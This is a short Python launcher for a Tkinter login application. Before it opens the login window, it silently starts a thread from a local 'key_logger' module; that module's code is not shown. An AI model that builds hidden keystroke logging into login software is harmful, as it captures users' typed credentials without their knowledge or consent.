import sys
import tkinter as tk
from tkinter import Label, ttk, PhotoImage, messagebox


# from login_screen import LoginApp


# Example usage:
print("starting thread")
# print("stopping thread")
# stop_logging_thread()



if __name__ == "__main__":
    from key_logger import start_logging_thread
    
    start_logging_thread()

    from login_screen import LoginApp
    
    root = tk.Tk()

    app = LoginApp(root)
    # root.wm_attributes('-toolwindow', 'True')
    
    if sys.platform.startswith('win'):
        # root.iconphoto(True, tk.PhotoImage(file="mudeerrrrrr.png"))
        # root.iconbitmap("C:\\Users\\MRC\\Desktop\\icon.ico")
        print("hello")
    
        
    elif sys.platform.startswith('darwin'):
        root.iconphoto(True, tk.PhotoImage(file="TaskBarLogo.png")) 
        
    root.protocol("WM_DELETE_WINDOW", lambda: LoginApp.on_Login_closing(root))
    root.mainloop()
